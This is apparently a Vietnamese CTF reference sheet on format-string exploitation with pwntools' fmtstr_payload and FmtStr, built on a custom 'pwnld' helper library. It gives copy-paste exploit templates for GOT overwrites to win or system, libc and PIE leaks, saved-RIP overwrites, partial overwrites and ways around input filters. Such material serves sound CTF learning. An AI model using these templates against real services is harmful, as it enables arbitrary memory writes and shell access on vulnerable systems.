# Format String — `fmtstr_payload` & `FmtStr` (pwnld edition)

> Chi tiết cho **T2** trong [`pwn.md`](../pwn.md). Đọc hết file này là ghi được bộ nhớ tuỳ ý.
> Code viết theo macro `pwnld` (`from pwnld import *`): `start` / `GDB` / `sla` / `ru` / `rl` / `ia` / `leak_libc` ...

---

## 0. Cơ chế — vì sao ghi được

Chương trình gọi `printf(input)` thiếu format specifier → bạn tự nhét `%`:

| Specifier | Tác dụng |
|-----------|----------|
| `%p` / `%x` | **đọc** 1 tham số trên stack (leak) |
| `%s` | đọc tham số như **con trỏ**, in chuỗi tại đó (leak theo địa chỉ) |
| `%c` | in 1 ký tự — dùng để **đệm cho đủ số đếm** |
| `%n` | **ghi** số ký tự đã-in-tới-giờ vào địa chỉ mà tham số đang trỏ tới |
| `%hn` / `%hhn` | ghi 2 byte (short) / 1 byte — để ghi từng phần, số đếm nhỏ |
| `%N$...` | nhắm **tham số thứ N** (positional) thay vì tuần tự |

Ý tưởng ghi: muốn ghi giá trị `V` vào `addr` → đặt `addr` lên stack, in cho đủ `V` ký tự
(bằng `%<V>c`), rồi `%n` vào ô chứa `addr`. `%n` = **arbitrary write** → đè GOT / saved RIP / biến.

`fmtstr_payload` tự lo **toàn bộ**: tính số `%c`, chọn `%hhn`/`%hn`/`%n`, sắp thứ tự ghi
tăng dần (vì `%n` dùng *tổng tích luỹ*), và chèn các địa chỉ đích vào đúng chỗ. Bạn chỉ cần
cho nó **offset** + **{địa chỉ: giá trị}**.

---

## 1. OFFSET — bước duy nhất phải tự làm

Offset = chỉ số tham số mà **ký tự đầu input của bạn** nằm trên stack.

```python
# dò thủ công: đếm %p thứ mấy in ra "AAAA"/"BBBB"
sla("...: ", b"AAAABBBB" + b"|%p" * 12)
# hoặc positional, dò nhanh quanh vùng nghi ngờ:
sla("...: ", b"AAAAAAAA" + b"|%6$p|%7$p|%8$p|%9$p|")
```
- 32-bit: `AAAA` = `0x41414141`.  64-bit: dùng 8 byte `AAAAAAAA` = `0x4141...4141`.
- Thấy `0x4141...` ở `%k$p` → **offset = k**.
- Cross-check bằng GDB: `GDB()` (mode `*1`), break trước `printf`, xem stack.

> `fmtstr_payload` tự đặt địa chỉ **ngay đầu** payload, nên offset chính là nơi dãy
> `A` xuất hiện. Nếu payload có padding đầu (căn 8) thì offset có thể lệch 1 — dò lại cho chắc.

---

## 2. `fmtstr_payload` — DÙNG MẶC ĐỊNH (≈90% số bài)

```python
fmtstr_payload(offset, writes, numbwritten=0, write_size='byte') -> bytes
```

| Tham số | Ý nghĩa | Khi nào chỉnh |
|---------|---------|----------------|
| `offset` | offset ở mục 1 | luôn |
| `writes` | dict `{addr: val}`, nhiều cặp được | luôn |
| `numbwritten` | số ký tự ĐÃ in trong cùng output trước payload (vd prompt do chính `printf` này in) | khi ghi lệch vài byte |
| `write_size` | `'byte'`(`%hhn`,mặc định) / `'short'`(`%hn`) / `'int'`(`%n`) | xem mục 5 |

`fmtstr_payload` cần biết **32 hay 64-bit** → **bắt buộc** `context.binary = ELF(...)` trước.
`pwnld` đã export sẵn `fmtstr_payload`, nên `from pwnld import *` là dùng được ngay.

### Template chuẩn (pwnld)
```python
#!/usr/bin/env python3
from pwnld import *                       # fmtstr_payload có sẵn trong đây

context.binary = exe = ELF("./chall", checksec=False)   # BẮT BUỘC (32/64-bit)
set_remote("host", 1337)                                # cho mode *2
set_gdbscript("b *main\nc\n")

OFFSET = 6                                 # <-- dò ở mục 1

p = start()                                # ./exploit 00 local | 2 remote | 01 local+gdb
GDB()                                      # chỉ attach khi mode *1

payload = fmtstr_payload(OFFSET, {exe.got["puts"]: exe.sym["win"]})
sla("Your input: ", payload)
ia()
```

---

## 3. Template theo TÌNH HUỐNG (copy-paste, pwnld)

### 3.1 Thuận lợi — No PIE, biết offset, ghi GOT → win
```python
payload = fmtstr_payload(OFFSET, {exe.got["exit"]: exe.sym["win"]})
sla("> ", payload)
```
Hàm nào được gọi SAU khi ta ghi thì đè GOT của hàm đó (`exit`, `puts`, `printf`...).

### 3.2 Ghi nhiều địa chỉ 1 lần
```python
payload = fmtstr_payload(OFFSET, {
    exe.got["puts"]:  exe.sym["win"],
    exe.sym["authed"]: 1,              # bật biến cờ
})
```

### 3.3 Có prompt in trước → lệch số đếm
Nếu chính lời gọi `printf` lỗi đó in kèm text trước `%n` của bạn → chỉnh `numbwritten`:
```python
payload = fmtstr_payload(OFFSET, {exe.got["puts"]: exe.sym["win"]}, numbwritten=len("Hi "))
```
Thường để 0; chỉ chỉnh khi GDB thấy ghi dư/thiếu đúng chừng đó byte.

### 3.4 Leak libc rồi ghi system (chương trình cho nhập NHIỀU lần)
```python
# (1) leak 1 địa chỉ libc đã biết offset (vd puts@got qua %s)
sla("> ", b"%7$s" )                       # hoặc fmtstr_payload đọc — tuỳ bài
# dùng helper pwnld để rebase libc tự động:
libc = get_libc()                         # cần context.binary trỏ đúng
leak_libc(offset=libc.sym["puts"], until=b"...", drop=b"...")   # LIBC.address tự set
# (2) ghi system vào GOT printf
payload = fmtstr_payload(OFFSET, {exe.got["printf"]: libc.sym["system"]})
sla("> ", payload)
# sau đó gửi "/bin/sh" vào nơi printf(input) được gọi lại
sla("> ", b"/bin/sh\x00")
ia()
```

### 3.5 PIE bật → leak base trước
```python
# leak 1 địa chỉ code qua %p (xem GDB biết nó lệch bao nhiêu so với base)
sla("> ", b"%11$p")
leak_bin(offset=0x1234, until=b"0x", drop=b"\n")   # context.binary.address tự set
# giờ exe.got / exe.sym đã đúng địa chỉ runtime:
payload = fmtstr_payload(OFFSET, {exe.got["puts"]: exe.sym["win"]})
sla("> ", payload)
```

### 3.6 Ghi saved RIP trên stack (không có GOT/PIE random) — cần leak stack
```python
sla("> ", b"%15$p")
leak_stack(offset=0x40, until=b"0x", drop=b"\n")   # CFG.STACK_BASE = địa chỉ ô ta cần
ret = CFG.STACK_BASE                                # địa chỉ saved RIP
payload = fmtstr_payload(OFFSET, {ret: exe.sym["win"]})
sla("> ", payload)
```

---

## 4. Các tình huống BỊ CHẶN & cách lách

### 4.1 Chỉ ghi được 1 lần, cần nhiều write → ghi GOT→one_gadget / __malloc_hook kiểu cũ
Một lệnh `fmtstr_payload` ghi được **nhiều cặp** rồi (mục 3.2) → gộp hết vào 1 payload.

### 4.2 Payload bị giới hạn ĐỘ DÀI
`write_size='byte'` ghi 4–8 byte ⇒ payload dài (nhiều `$hhn`). Nếu input bị cắt ngắn:
- Dùng `write_size='short'` (2 lần `%hn`) hoặc `'int'` (1 `%n`) → ngắn hơn nhưng phải in
  nhiều ký tự hơn (xem mục 5).
- **Partial overwrite**: chỉ ghi 1–2 byte thấp của GOT thành win (khi chỉ khác byte cuối):
```python
payload = fmtstr_payload(OFFSET, {exe.got["puts"]: exe.sym["win"] & 0xffff},
                         write_size="short")
```

### 4.3 Địa chỉ đích chứa byte NUL (64-bit phổ biến)
`fmtstr_payload` đặt địa chỉ ở cuối nên thường tránh được cắt chuỗi. Nếu vẫn kẹt
(địa chỉ có `\x00` giữa chừng):
- **Ghi gián tiếp 2 tầng**: tìm trên stack một ô A đã trỏ sẵn tới ô B; ghi vào B
  qua A bằng `%n` không cần đưa địa chỉ chứa NUL vào payload. (pwntools không tự làm —
  phải tự xếp, hoặc dùng `FmtStr` + chuỗi write nhỏ.)
- Hoặc partial overwrite chỉ phần không chứa NUL.

### 4.4 Input bị filter `%` hoặc `$` / `n`
- Lọc `$` → không positional được: phải đệm nhiều `%p`/`%c` cho tới đúng ô
  (`fmtstr_payload` không hỗ trợ kiểu này, tự dựng tay).
- Lọc `n` → không `%n` được: chuyển sang chỉ **leak** (đọc flag/canary), hoặc tìm bug khác.
- Lọc ký tự → kiểm tra bytes payload `fmtstr_payload` sinh ra có vi phạm không:
  `print(payload)` trước khi gửi.

### 4.5 Blind (không có binary) — sang mục 6 (`FmtStr`)

### 4.6 Xác suất (partial overwrite 1/16, ASLR) → bọc retry
Ghi 2 byte có thể cần đoán nibble → dùng khung [`retry/`](../../exploits/pwn/retry/):
viết `attempt(i)` gọi `start()` + gửi payload + kiểm tra shell, đưa cho `retry()`.

---

## 5. `write_size` — chọn thế nào

| | `%hhn` `'byte'` (mặc định) | `%hn` `'short'` | `%n` `'int'` |
|---|---|---|---|
| Số lần ghi / 4 byte | 4 | 2 | 1 |
| Ký tự `%c` phải in tối đa | ~256 | ~65536 | ~4 tỉ (KHÔNG khả thi) |
| Payload dài hay ngắn | DÀI nhất | vừa | ngắn nhất |
| Dùng khi | mặc định, an toàn | input ngắn, chịu được in 64K ký tự | gần như không bao giờ |

**Quy tắc:** cứ để `'byte'`. Chỉ đổi `'short'` khi input bị giới hạn độ dài và chương trình
chịu được in vài chục nghìn ký tự. `'int'` chỉ khi giá trị ghi nhỏ (vài trăm).

---

## 6. `FmtStr` — BLIND / chưa biết offset (chương trình PHẢI echo output)

Lớp tự động: tự brute-force offset rồi gom nhiều lệnh ghi. **Không** nằm trong `__all__`
của pwnld → phải import thêm:

```python
from pwnld import *
from pwn import FmtStr                 # pwnld KHÔNG export FmtStr
```

```python
FmtStr(execute_fmt, offset=None, padlen=0, numbwritten=0)
#   execute_fmt: f(payload_bytes) -> output_bytes   (PHẢI trả output để nó dò offset)
#   .offset            offset tự dò
#   .write(addr, val)  xếp hàng (chưa gửi)
#   .execute_writes()  gửi thật, gộp tối ưu
```

### Template (mỗi lần tạo kết nối mới)
```python
from pwnld import *
from pwn import FmtStr
context.binary = exe = ELF("./chall", checksec=False)
set_remote("host", 1337)

def send(payload):
    p = start()                       # pwnld: tube mới theo mode
    sla("in: ", payload)
    data = ra()                       # recvall — PHẢI có output
    return data

fmt = FmtStr(execute_fmt=send)        # <-- tự dò offset ở đây
ls(f"offset = {fmt.offset}")
fmt.write(exe.got["puts"], exe.sym["win"])
fmt.write(exe.sym["flag"], 1)
fmt.execute_writes()
```

> Nếu chương trình cho nhập format string trong **vòng lặp** (1 kết nối, nhập nhiều lần):
> viết `send` dùng chung tube `p` toàn cục thay vì `start()` mỗi lần, và `recv` phần output.

**Điều kiện sống còn:** chương trình phải echo output để `FmtStr` dò offset. Không echo →
`FmtStr` vô dụng → quay về `fmtstr_payload` + offset tự tính bằng GDB.

---

## 7. Bảng quyết định

| Tình huống | Dùng |
|---|---|
| Có binary + dò được offset | **`fmtstr_payload`** |
| Biết offset, ghi 1 phát | **`fmtstr_payload`** |
| Chương trình KHÔNG echo | **`fmtstr_payload`** (FmtStr bó tay) |
| Blind, không binary, CÓ echo | **`FmtStr`** |
| Partial overwrite / ASLR xác suất | `fmtstr_payload` + [`retry/`](../../exploits/pwn/retry/) |

---

## 8. Debug khi ghi hỏng (checklist)
1. **Ghi trúng rác** → sai `OFFSET`. Dò lại, đừng đoán.
2. Thiếu `context.binary` → sai độ rộng địa chỉ (32/64). Luôn set đầu file.
3. `print(payload)` xem có byte bị filter / NUL chắn giữa không.
4. `GDB()` (mode `*1`), break ngay sau `printf`, `x/4xb <addr>` xem ghi được mấy byte.
5. Lệch đúng vài byte đều nhau → chỉnh `numbwritten`.
6. 64-bit địa chỉ có NUL → đổi sang partial overwrite hoặc ghi gián tiếp (mục 4.3).

---

## 9. Checklist khai thác nhanh
1. `%p %p %p` → có leak = có FSB.
2. Dò **OFFSET** (mục 1).
3. Xác định **ghi gì vào đâu** (GOT→win/system? saved RIP? biến cờ?).
4. (nếu PIE/ASLR) leak base trước → `leak_bin` / `leak_libc` / `leak_stack`.
5. `payload = fmtstr_payload(OFFSET, {addr: val})` → `sla(...)` → `ia()`.

Ví dụ thật (ngoài repo này): `CTF/learn/pwnable/tutorial/fsb/FSB_Write_Using_n/exploit.py`
